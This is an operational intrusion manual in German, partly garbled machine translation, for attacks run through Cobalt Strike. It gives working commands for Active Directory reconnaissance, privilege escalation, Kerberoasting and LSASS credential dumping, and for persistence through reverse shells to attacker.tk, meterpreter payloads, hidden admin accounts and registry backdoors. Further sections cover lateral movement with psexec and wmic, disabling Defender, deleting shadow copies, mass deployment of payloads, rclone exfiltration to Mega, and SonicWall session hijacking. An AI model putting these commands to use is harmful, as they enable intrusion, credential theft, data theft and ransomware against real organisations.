													MANUAL COBALT STRIKE
!---------------------------------------------------Standard-Befehle---------------------------------------------------!							
Lastaufbauende
Attacks->Packages->

interact - einen Vertreter auswählen
help -> zeigt eine Liste von Teams
help [command] zeigt die Hilfe zu einem bestimmten Befehl an

										
!-----------------------------------------------------Sammeln von AD-Informationen--------------------------------------------------!

!---Beziehen eines Domänencontrollers---!
net domain_controllers
net dclist
shell nltest /dclist

!---Beschaffung einer Liste von Computern---!
shell net group "Domain Computers" /domain
net computers
net view
Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem !--Test--!

!---Abrufen einer Liste von Subdomains---!
net domain_trusts
shell nltest /DOMAIN_TRUSTS

!---Abrufen einer Liste von Gruppen und Benutzern---!
shell net group "domain Admins" /domain  - Liste der Domänenadministratoren ; für Deutsche - shell net group "Domänen-Admins" /domain
shell net group "Enterprise Admins" /domain - Enterprise Admins
shell net group "domain users" /domain - Liste der Domänenbenutzer
net group
net localgroup
net user

!---Extras---!
net domain|systeminfo | findstr /B "Domain" - Zeigt an, in welcher Domäne sich der PC befindet
net sessions - Zeigt aktive Sitzungen auf dem PC an
net time - Die Zeit auf dem PC wird angezeigt
net logons - Zeigt Listen der am PC angemeldeten Benutzer an

!---Empfang ShareFinder---!
net share - Zeigt die Liste der Ballons auf dem PC an

Sammeln Sie die verfügbaren Freigaben und sehen Sie nach, ob für unseren aktuellen Benutzer in der Domäne $ADMIN-Freigaben verfügbar sind.
	-	powershell-import /opt/PowerSploit-dev/Recon/PowerView.ps1
	-	powershell Invoke-ShareFinder -CheckShareAccess -Verbose
Analog zu:
	-	powershell-import /opt/PowerSploit-dev/Recon/ShareFinder.ps1
	
	-	psinject 4728 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
(in dem Moment, in dem der Scan begonnen hat und das Ergebnis in eine Datei geschrieben wird, wird die Datei vollständig vergrößert, wenn der Scan beendet ist und heruntergeladen werden kann)

Denken Sie auch daran, sich die Prozesse mit dem Befehl ps anzusehen. Dort können Sie einen Benutzer finden, zu seinem Prozess migrieren > Explore > Process list > dann den Prozess eines anderen Benutzers auswählen.
Nach der Umstellung auf einen neuen Benutzer müssen Sie auch die Eier abnehmen, um zu sehen, wo Sie damit einbrechen können
Wenn Sie die Sprechblasen abnehmen und in C:\ProgramData eine sh.txt oder shares.txt gefunden haben, laden Sie sie herunter und sehen Sie nach, wie viele "Remote-Admin" im Lehrbuch stehen.

!---Zusätzliches Werkzeug---!

!-Sammeln von Active Directory-Zusammensetzungsinformationen mit AdFind.exe-!
	-	adfind.exe und adf.bat in einen beschreibbaren Ordner laden
	-	Cobalt Strike Beacon in diesen Ordner verschieben
	-	Starten shell adf.bat
	-	auf die Fertigstellung des Skripts warten
	-	Laden Sie das Ergebnis herunter und löschen Sie, was Sie auf den Computer heruntergeladen haben
	
Inhalt adf.bat:

adfind.exe  -f "(objectcategory=person)" > ad_users.txt
adfind.exe  -f "objectcategory=computer" > ad_computers.txt
adfind.exe -f "(objectcategory=organizationalUnit)" >  ad_ous.txt
adfind.exe -sc trustdmp > trustdmp.txt
adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt
adfind.exe  -f "(objectcategory=group)" > ad_group.txt
adfind.exe -gcb -sc trustdmp > trustdmp.txt
	
!-Sammeln von Informationen über Ihr aktuelles Fahrzeug mit SeatBelt-!
	-	execute-assembly /opt/cobalt_strike_extension_kit/exe/Seatbelt.exe -group=all -outputfile="C:\ProgramData\textinfo.txt"
(keine Erklärung hier, die Anzahl der Überprüfungen ist anständig und alle gesammelten Informationen sind in gewisser Weise wichtig, sowohl auf dem lokalen Rechner als auch im Netz)


!---------------------------------------------Methoden zur Erhöhung der Privilegien-----------------------------------------------!

!---Verwendung von Exploits---!
shell systeminfo - Beschaffung von Informationen über das System.
Die Informationen müssen in eine Textdatei geschrieben werden (win10-systeminfo.txt)
Verwenden Sie den Windows-Exploit-Suggester, der Ihnen ungefähr zeigt, welche Exploits Sie verwenden können..
!---Aktualisierung der Exploit-Datenbank---!
/windows-exploit-suggester.py --update
[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2021-03-09-mssb.xls
[*] done
!---Ausführen eines Programms zur Erkennung von Exploits---!
./windows-exploit-suggester.py --database 2021-03-09-mssb.xls --systeminfo win10-systeminfo.txt

Wenden Sie dann die von Windows-Exploit-Suggester gelisteten Exploits auf den Rechner an. (Es ist jedoch ratsam, sich über den Exploit, den Sie verwenden möchten, zu informieren, da er für Ihre Zwecke möglicherweise nicht geeignet ist, und besonders auf die Betriebssystemversion und die Bit-per-Version zu achten.)
Zum Beispiel:
Option 1:
elevate ms16-135 [listener]  - der Befehl verwendet den Exploit ms16-135 und ruft im Erfolgsfall eine neue Sitzung unter SYSTEM auf.

Option 2:
Gehen Sie zum Beispiel in dieses Verzeichnis С:\Users\User1\Pictures (können Sie in ein beliebiges anderes Verzeichnis verschieben, solange Sie das Ladeprogramm laden können)
Laden Sie Ihre Ladung upload artifact.exe|dll|One-liner
runasadmin ms16-032 (Geben Sie das Verzeichnis an)artifact.exe [Parameter, falls erforderlich]  Befehl verwendet den Exploit ms16-032, um Ihre Last unter SYSTEM auszuführen. In diesem Fall erhalten Sie einen neuen Agenten unter SYSTEM.

!---SharpUp---!
SharpUp - ist ein Fehlkonfigurations-Scanner für Privilegieneskalation.
Durchführung des Scans:
	-	execute-assembly /opt/cobalt_strike_extension_kit/exe/SharpUp.exe
Beispielhafte Ausgabe (möglicherweise gibt es nichts zu finden):

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Services ===
Name				:VMtools
DisplayName	:VMware Tool
Discription		:Provides support for synchronizing objects between the host and qwest operation system.
State				:Stopped
StartMode			:Auto
PathName		:C:\Program Files\VMware\VMware Tools\vmtoolsd
=== Modifiable Service Binaries ===

=== AlwaysInstallElevated Registry Keys ===

=== Modifiable Folders in %PATH% ===

=== Modifiable Registry Autoruns ===

=== *Special* User Privileges ===

=== Unattended Install Files ===

=== McAfee Sitelist.xml Files ===

=== Cached GPP Password ===

Sehen Sie, dass unser Benutzer den VMtools-Dienst ändern kann, um die Last auszuführen.
Gehe zu Attacks --> WindowsExecutable (S) --> unseren [Listener] auswählen und ausgeben Windows Service EXE --> Generate -->FileName:vmtoolsd.exe --> Save
Dann leiten Sie es in ein beliebiges Verzeichnis weiter, z. B.: C:\Users\User1\Pictures und laden unsere Ladung.
Ändern Sie nun den Dienst:
run sc config  vmtoolsd binpath=C:\Users\User1\Pictures\vmtoolsd.exe
run start vmtoolsd.exe
Danach sollte das Mittel aus dem SYSTEM kommen.



!------------------------------------------Erlangung von Hashes und Passwörtern------------------------------------------------!

(KANN OHNE PRIVILEGIEN DURCHGEFÜHRT WERDEN)
!----Kerberoast-Angriff - Hashes aus dem Speicher holen---!

Durchführen eines Kerberoast-Angriffs:
	-	execute-assembly /opt/cobalt_strike_extension_kit/exe/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
	-	execute-assembly /opt/cobalt_strike_extension_kit/exe/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
	-	Laden Sie die Ergebnisdateien herunter (falls Sie ein Ergebnis erhalten haben)
	-	Falls nicht, verwenden Sie ein alternatives Powershell-Skript, um den Angriff auszuführen:
	-	powershell-import /opt/PowerSploit-dev\Recon\PowerView.ps1
		Analog zu:
	-	powershell-import /opt/PowerSploit-dev\Recon\Invoke-Kerberoast.ps1
	-	psinject 4728 x86 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8 
            4728 ist in diesem Fall die aktuelle Pid und x86 ist ihre Bitgröße
      (die erhaltenen Hashes werden an die Brute-Force-Methode gesendet, um Klartext-Passwörter zu erhalten, oder sie werden im Rahmen der SYSTEM-Rechte verwendet)
	  
Sammeln von Informationen aus dem Chrome-Browser
	-	execute-assembly /opt/cobalt_strike_extension_kit/exe/SharpChrome.exe logins /showall
(Hier erhalten wir eine Reihe von Passwörtern für den aktuellen Benutzer und eine Vorstellung von den Netzwerk- und externen Ressourcen, auf die sie zugreifen)
	  
Prüfung auf gespeicherte Kennwörter in Gruppenrichtliniendateien der Domäne
	-	execute-assembly /opt/cobalt_strike_extension_kit/exe/Net-GPPPassword.exe
	Analog zu:
	-	powershell-import /opt/PowerSploit-dev/Exfiltration/Get-GPPPassword.ps1
	  
(NUR MIT PRIVILEGIERTEN RECHTEN*)

Wenn wir PRIVILEGE-Rechte haben, können wir mit den Befehlen "hashdump" und "logonpasswords" Hashes und Passwörter erhalten. Dies ist eine schnelle Methode, um an Passwörter zu gelangen, aber sie funktioniert möglicherweise nicht. Zum Beispiel mit AV stören.
Es ist besser, es so zu machen:
	-	Machen Sie ps und finden Sie den LSASS.exe Prozess (Er behält unsere Passwörter).Denken Sie an die PID.
	-	Machen Sie einen dump.
Gehe zu beacon:
	- cd Windows
	- shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\Users\User1\lsass.dmp full 
	- Geben Sie im Parameter PID die PID-Nummer von LSASS.exe an
	- Sie können jedes Verzeichnis verwenden, in dem das Schreiben erlaubt ist, z. B.: C:\Users\User1\lsass.dmp
Analog zu:
	- execute-assembly /opt/cobalt_strike_extension_kit/exe/SharpDump.exe
Wenn Sie den Dump gemacht haben, laden Sie ihn herunter.
Nach dem Herunterladen öffnen Sie mimikatz auf Ihrem Rechner und führen Sie die folgenden Befehle aus. (lsass.dmp in den Ordner mimikatz legen)
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords





!------------------------------------------------------Persistence-----------------------------------------------------!
(KANN OHNE PRIVILEGIEN DURCHGEFÜHRT WERDEN)
Erstellen Sie explorers.bat und fügen Sie folgenden Code hinzu (Kopieren Sie die Klammern nicht):
}
	@echo off
	set fullname=C:\Temp\explorers.exe
	set prog=explorers.exe
	:begin
	tasklist /fi "IMAGENAME eq %prog%"|>nul find "%prog%"||start "" "%fullname%"
	>nul ping 127.1 -n 6
	goto :begin 
}
Als Nächstes laden Sie unsere explorers.exe und die explorers.bat-Batchdatei in ein beliebiges Verzeichnis, in das Sie die Dateien schreiben können, z. B.: "C:\Users\User1\Pictires"
Als nächstes öffnen Sie CS und unseren Beacon und navigieren zu dem Ordner, in den unsere Dateien heruntergeladen wurden
Führen Sie den Befehl aus (er wird unsere Dateien ausblenden): 
shell attrib +h [explorers.exe]
shell attrib +h [explorers.bat]
Fügen Sie dann die Schlüssel zur Registrierung hinzu:
shell reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v explorers /t REG_SZ /d "C:\Temp\explorers.exe"
shell reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v explorers /t REG_SZ /d "C:\Temp\explorers.bat"
Überprüfen Sie:
shell reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
------------------------------------------------------------------------------------------------------------------------------------
Sie können den Powershell Stager verwenden, aber wenn Sie ihn als normaler Benutzer ausführen, wird ein cmd-Fenster auf dem Desktop angezeigt und dann sofort geschlossen
{
@echo off
set fullname=powershell.exe
set paramtr= powershell -nop -w hidden -encodedcommand...(ваш stager) 
set prog=powershell.exe
:begin
tasklist /fi "IMAGENAME eq %prog%"|>nul find "%prog%"||start "" "%fullname%" "" "%paramtr%"
>nul ping 127.1 -n 6
goto :begin
}
Fügen Sie dann den Schlüssel zur Registrierung hinzu:
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v explorers /t REG_SZ /d "C:\Temp\explorers.bat"
Überprüfen Sie:
reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s

Sie können den Schlüssel auch in die Registrierung unter diesem Verzeichnis schreiben reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, aber um einen Schlüssel in diesem Verzeichnis zu erstellen, benötigen Sie PRIVILEGE RIGHTS*

!---In-memory---!
Die Einführung einer Hintertür, die sich im Arbeitsspeicher befindet, ist sinnvoll, wenn Sie auf dem Zielcomputer Fuß fassen wollen, ohne Spuren zu hinterlassen. Antivirenprogramme haben in der Regel nur wenig Kontrolle über speicherinterne Aktivitäten, da diese einen hohen zusätzlichen Ressourcenverbrauch verursachen. Selbst ein erfahrener Benutzer wird wahrscheinlich nichts bemerken, was sich in einem legitimen Prozess versteckt.
Wir werden meterpreter als speicherinterne Hintertür verwenden. Dies ist wahrscheinlich der bekannteste RAT, der ausschließlich im Speicher arbeiten kann, ohne die Festplatte zu berühren.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888 -f raw -o meter32.bin exitfunc=thread StagerRetryCount=999999
cmd$> inject_windows.exe PID meter32.bin

Der Preis für maximale Unauffälligkeit ist der Verlust der Persistenz nach dem Neustart.
Da der bösartige Thread außerhalb einer Bibliothek läuft, zeigt Procexp einen solchen Thread oft als von einer Nulladresse aus laufend an.

Office
Diese Methode ist geeignet, wenn der angegriffene Benutzer häufig mit einem Office-Paket arbeitet. Das ist gar nicht so ungewöhnlich!
reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\users\username\meter.dll

    Vorteile: übersteht den Neustart, passt zu jedem Benutzer.
    Minus: unkontrollierbares Anlaufintervall.

(NUR MIT PRIVILEGIERTEN RECHTEN*)

!---Absicherung über den "Task Scheduler"---!
Wir werden den Taskplaner verwenden, um ihn zu sichern, indem wir unsere vorgefertigte xml-Datei importieren.
1)das vorgefertigte Python-Skript ausführen und die xml-Datei erzeugen.
Für dieses Skript müssen Sie mehrere Parameter eingeben:
	-	start programm - wird diese Aufgabe ausgeführt, powershell.exe | artifact.exe | rundll32.exe
	-	stager PowerShell or other parameters - Parameter, die an das auszuführende Programm übergeben werden, für powershell.exe ist dies stager powerShell, artifact.dll [Parameter]
	-	date registration task - das Datum, an dem die Aufgabe registriert wurde, können Sie sich die andere Aufgabe ansehen, die Sie als.
	-	date end task - Enddatum der Aufgabe
	-	time repeat task in day - wie oft die Aufgabe wiederholt wird, "PT3M" alle 3 Minuten; "PT1P" jede Stunde; wenn das Programm läuft, startet die Aufgabe keine neue Programmsitzung.
	-	name_xml - den Namen Ihrer xml, verwenden Sie Namen wie: Adobe Update, WindowsDefender usw...
Danach wird die erforderliche XML-Datei erstellt. Dann laden wir sie auf den Client-PC hoch, auf dem wir den Anker setzen wollen.
Gehen Sie dann in das Verzeichnis, in das Sie unsere xml heruntergeladen haben, und geben Sie im Beacon den Befehl:
shell schtasks /Create /RU SYSTEM /XML Security_Update.xml /TN WinDefender 
Danach löschen Sie die xml, wir brauchen sie nicht mehr.
rm Security_Update.xml


!---Dienstleistungen---!
Verwenden Sie Dienste zur Sicherung, da Service Manager den Dienst bei Bedarf selbst neu startet..

shell sc create persistence binPath= "nc.exe -e \windows\system32\cmd.exe attacker.tk 8888" start= auto
shell sc failure persistence reset= 0 actions= restart/60000/restart/60000/restart/60000
shell sc start persistence 

    Vorteile: übersteht Neustart, überschaubares Startintervall, für jeden Benutzer geeignet.
    Nachteil: Administratorrechte sind erforderlich.

!---Konfigurationen---!
Die Organisation der Persistenz durch Änderungen der Betriebssystemkonfiguration ist eine gute Möglichkeit, sich vor Antivirenprogrammen zu verstecken. Dies ist der einzige Fall, in dem wir überhaupt keinen ausführbaren Code verwenden. Dies gilt jedoch nur, wenn wir direkten Zugriff auf den Zielcomputer haben.
Die Erstellung eines versteckten Benutzers, der dann für den Fernzugriff verwendet werden kann, ist wahrscheinlich die bekannteste Möglichkeit für einen solchen Angriff.

net user attacker p@ssw0rd /add
net localgroup administrators /add attacker
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v attacker /t REG_DWORD /d 0 /f

Einfaches und effektives Bookmarking von Windows über RDP:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"
reg add "HKLM\system\currentcontrolset\control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0x0 /f

    Vorteile: schwer mit Antivirus zu erkennen, überlebt Neustart.
    Nachteile: Erfordert Administrator-/Root-Rechte, nicht geeignet, wenn sich der Rechner hinter einer NAT oder Firewall befindet.

!---Debugger---!
Wenn ein Angreifer weiß, dass der angegriffene Benutzer häufig ein Programm, z. B. einen Taschenrechner, ausführt, kann er seinen Code mithilfe eines Joyrunners in den Hauptteil dieses Programms einfügen. Jede Manipulation von ausführbaren Dateien erhöht jedoch unweigerlich das Misstrauen der Antivirenprogramme gegenüber diesen Dateien. Eine viel elegantere Ausführung wäre, den Start abzufangen:
copy calc.exe _calc.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe -e c:\windows\system32\cmd.exe attacker.tk 8888" /f

Sobald das Opfer den Rechner startet und dann wieder schließt, nimmt der Angreifer die reverse shell.

    Plus: einen Neustart erleben.
    Nachteil: Erfordert Administratorrechte.
 
!---Gflags---!
Genauso können Sie dafür sorgen, dass Ihr Code ausgeführt wird, wenn der Benutzer ein bestimmtes Programm schließt.
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc -e \windows\system32\cmd.exe attacker.tk 8888"

    Plus: einen Neustart erleben.
    Nachteil: Erfordert Administratorrechte.

Autoruns erkennt diese Methode nicht, aber Sie können die Verzweigung der Registrierung überprüfen:
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
 
!---WMI---!
Ein einigermaßen zuverlässiger Weg zum Autorun ist über WMI-Ereignisse. Wir können die Hintertür in regelmäßigen Abständen öffnen.
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""

    Vorteile: übersteht Neustart, kontrolliertes Startintervall.
    Nachteil: Erfordert Administratorrechte.

!---AppInit---!
Unter Windows gibt es eine interessante Möglichkeit, Bibliotheken mit AppInit in Windows-Anwendungen einzubinden (sie müssen user32.dll verwenden).
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter64.dll" /f
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter32.dll" /f

    Plus: einen Neustart erleben.
    Schwächen: Erfordert Administratorrechte, unkontrollierbares Startintervall.

!---Lsass---!
Eine andere Möglichkeit besteht darin, die Bibliothek in den Systemprozess lsass einzubinden. Dies ist sehr vorteilhaft, da dieser Prozess genau die Anmeldedaten speichert, die wir mit dem Dienstprogramm mimikatz abrufen.
reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f

    Plus: einen Neustart erleben.
    Schwächen: Administratorrechte erforderlich, unkontrollierbares Startintervall, kann das System beenden.

!---Winlogon---!
Um jedes Mal, wenn sich ein Benutzer anmeldet, eine Shell zu öffnen, können Sie den Winlogon-Mechanismus verwenden.
reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\windows\meter.exe"

    Plus: einen Neustart erleben.
    Minus: unkontrollierbares Anlaufintervall.

!---Netsh---!
Das Netzwerkkonfigurationsprogramm Netsh ermöglicht es Ihnen auch, eine beliebige Bibliothek zu laden. Dies eröffnet die Möglichkeit, eine spontane automatische Ladung zu organisieren. Das Ergebnis sieht harmlos aus, denn die Windows-Systemkomponente heißt zunächst.
cmd#> c:\windows\syswow64\netsh.exe
netsh> add helper c:\windows\meter32.dll
cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"

Das Ergebnis ist diese Kette: autorun → netsh.exe → meter.dll.
Die meter.dll wird ausgeblendet - der Benutzer sieht nur die legitime Netsh-Ausführung, eine native Windows-Komponente.

    Vorteile: überlebt einen Neustart, ist für den Benutzer schwer zu erkennen.
    Nachteil: Erfordert Administratorrechte.





!----------------------------------------------------Lateral Movement---------------------------------------------------!

Wenn es uns gelungen ist, den Benutzernamen und das Passwort eines Benutzers auf dem Opfer-PC zu erhalten, tun Sie spawnas Domain\Admin Password [listener], ein neuer Agent wird kommen, der Prozess wird unter diesem Benutzer laufen.

Wenn wir die Benutzername/Passwort-Domäne eines Admins oder Benutzers gefunden haben, können wir dessen Token nehmen, der Befehl sieht wie folgt aus
	-	make_token Domain\Admin Pass
wenn Sie ein Token zurückziehen wollen, den Befehl:
	-	rev2self

Zum Menü gehen Cobalt Strike-->Visualization-->Target Table oder klicken Sie auf das Zielsymbol.
Dies ist der Ort, an dem sich Ihre Ziele befinden werden, sobald Sie Folgendes getan haben (net dclist, net domain_controllers, net computers, portscan)
Drücken Sie PCM auf dem PC, zu dem Sie springen möchten.-->Jump:
psexec
psexec64
psexecpsh
ssh
ssh-key
winrm
winrm64

Wenn der Agent einen Systemprozess hat, kann der Befehl getsystem verwendet werden, um die Systemberechtigungen zu erhöhen.

Wenn wir den Benutzernamen und den Hash eines Benutzers gefunden haben und den Hash nicht entschlüsseln konnten, führen wir den folgenden Befehl aus pth Domain\Admin  hash [command] 
(Erfordert privilegierte Rechte), indem Sie die Befehle:
	-	shell dir \\ip 
	-	Hostname\c$ 
Kontrolle des Zugangs zum Server oder zu den normalen PCs.
Wenn Sie Zugang haben, klicken Sie auf Sitzungen > File Browser > Schreibpfad \ip oder Computername \c$, laden Sie dort die Datei hoch 
shell wmic /node:[ip] process call create "rundll32.exe C:\Temp\artifact.dll StartW"
shell wmic /node:[ip] process call create "C:\Temp\artifact.exe" 



!--------------------------------------------------Attacks-------------------------------------------------------------!
!--BAT--!
immer alles als Administrator ausführen:
uac - entfernt das Pop-up-Fenster, das die Erlaubnis zur Ausführung als Administrator verlangt
defoff - Kill Defender (funktioniert nicht bei allen, prüfen Sie danach im Taskmgr den Mspeng-Prozess)
RDP - nimmt den Port 3389 auf


del - delete Shadow copy (nach der Erlaubnis zum Löschen fragt, drücken Sie - y)
NS - Versteckte Systemlaufwerke einhängen (pass:98) !

NLA+BACK - korrigiert die NLA + Hintertür zum Einloggen ohne Passwort, funktioniert wie folgt: 
      im Anmeldefenster (wo nach den Anmeldedaten gefragt wird) - drücken Sie win+Y und das cmd-Fenster öffnet sich
      taskmgr schreiben, die Registerkarte Benutzer öffnen, auf einen beliebigen Benutzer klicken - verbinden
p.s - Funktioniert nicht bei Zehnern \erfordert einen Pass 


ZUSAMMENSTELLUNG EINER DOMÄNENWEITEN BATCH-DATEI ZUM KOPIEREN VON DATEIEN
start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\PRIMARY ДОМЕН КОНТРОЛЛЕР\share$\fx166.exe" "C:\windows\temp\" 
SPEICHERN UNTER "COPY.BAT"

ZUSAMMENSTELLUNG EINER BATCH-DATEI ZUR AUSFÜHRUNG IN DER DOMÄNE
start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe
SPEICHERN UNTER "EXE.BAT"

WMI-BATCHDATEI-SAMMLUNG ZUM KOPIEREN UND AUSFÜHREN DER DATEI IN DER DOMÄNE
start wmic /node:@C:\share$\comps1.txt /user:"DOMAIN\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \\ДОМЕН КОНТРОЛЛЕР\share$\fx166.exe %APPDATA%\fx166.exe&%APPDATA%\fx166.exe"


!--------------------------------------------------------RDP------------------------------------------------------------!
WENN SIE WIRKLICH EINE RDP IN DER NÄHE BRAUCHEN :: WIE SIE NICHT ERWISCHT WERDEN ::
1. Server-Betriebssystem auswählen, pingen, gefunden. Ein Verzeichnis erstellen
`ls \\REMOTE-HOSTNAME\C$\Users`
Sortieren nach Geändert. Wo es einen frischen Touch gibt - du solltest dich auf keinen Fall unter diesen Pushern einloggen, weil es leicht zu folgender Situation kommen kann - du loggst dich ein, du lädst Bälle herunter/test etwas und plötzlich loggt sich dieser Pusher auf diesem PC ein und sieht deine Arbeitsergebnisse... Erkennen. Aufräumen. Das Spiel ist vorbei.
Wählen Sie dazu einen Benutzer aus, der im letzten Jahr auf diesem Server war, z. B..
Ich denke, die Mechanismen sind klar?
2. Auswahl eines Benutzers aus YES, der in YES hängt, aber kaum benutzt wird

shell net group "Domain Admins" /domain


Dies ist unsere YES-Liste
Als nächstes gehen wir einen Schritt nach dem anderen
`shell net user Administrator /domain`
Suchen Sie nach Last Logon, d. h. dem Zeitpunkt, an dem Sie sich das letzte Mal im Netzwerk angemeldet haben (auf einem der PCs im Netzwerk).
Wenn es ein Datum wie den vorletzten Monat, ein halbes Jahr oder sogar ein Jahr hat, ist das großartig. Das ist es, was wir brauchen. Höchstwahrscheinlich handelt es sich entweder um ein Dienstkonto oder ein Administratorkonto, auf das sie nicht zugreifen, und Sie können es nicht über RDP verwenden.

Mit einfachen Tricks wie diesen können Sie vermeiden, dass Sie bei der PDP auf der Strecke bleiben

3. Bleiben Sie nicht bei RDP, sondern melden Sie sich ab (MUSS), wenn Sie fertig sind. Nicht zu verwechseln mit dem einfachen Schließen des RDP-Fensters.





!---------------------------------------------Zusätzliches Material-------------------------------------------------------!

!---RCLONE MANUAL--!
1. Laden Sie rclone von einem externen Server herunter, erstellen Sie eine rclone.conf-Datei und legen Sie sie in denselben Ordner wie die Exe-Datei.
2. Öffnen Sie dann cmd als Administrator, navigieren Sie zu dem Ordner mit der Konfigurationsdatei und führen Sie den Befehl: rclone config
3. Dann erscheint ein Menü, in dem wir eine Konfiguration erstellen (grob gesagt, geben wir Login und Passwort für den Mega ein), nachdem wir die Anmeldedaten eingegeben haben, schreibt die Software sie in die Datei rclone.conf, in verschlüsselter Form.
4. Nehmen Sie die Datei rclone.conf und das Programm selbst und legen Sie sie auf dem Rechner ab, von dem Sie die Informationen abrufen wollen; natürlich ist es besser, sie an einem abgeschiedenen Ort abzulegen
5. Gehen Sie zu CS beacon in dem Ordner, in dem Sie die Konfiguration und das Programm abgelegt haben, und führen Sie den Befehl:

shell rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

remote:Data - Wir ändern dies nur. 
"remote" ist der Name Ihrer Mega.
"NT" Ihr Verzeichnis im Megaplex, in das es heruntergeladen werden soll; wenn es nicht existiert, wird es selbst erstellt.

Ich denke, es ist klar, dass das, was in Anführungszeichen steht, das ist, was wir herunterladen, wir können es beliebig spezifizieren, wir können die ganze Festplatte spezifizieren
remote - der Name der Konfiguration, die wir in Schritt 3 eingegeben haben, data ist der Ordner im Megabyte, in den die Informationen hochgeladen werden

!---SonicWall---!
für diejenigen, die mit SonicWall über Browser-Sitzungen arbeiten müssen
Verwendung eines WEB-Browsers für den Zugang

- die Sitzung aus der Skriptausgabe entnehmen, z. B. "47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg="
- Öffnen Sie den Browser im Inkognito-Modus, öffnen Sie die Entwicklerkonsole (js-console)
- Sitzungs-ID in base64 kodieren
  >> btoa ("47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg=") [ENTER]
  "NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0="
- https://target in die URL eingeben (leitet zu https://target/cgi-bin/welcome weiter)
- Gehen Sie in der Konsole zu Anwendung/Cookies und fügen Sie ein Cookie hinzu
  swap : NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0=
- im Browser (wo .../cgi-bin/welcome steht) korrigieren Sie die URL auf https://target/cgi-bin/portal
- Zugriff auf die Ressource unter der Sitzung des Benutzers

!---Installieren und Einrichten von Citrix---!
----------------------------------
---SPRACHE LEIDER NOCH NICHT BEKANNT---

Windows 7 oder Windows 10 
Na nee InternetExplorer 11 ili google chrome
Posle ustanovki braruzera nastraivaem Citrix Workspace

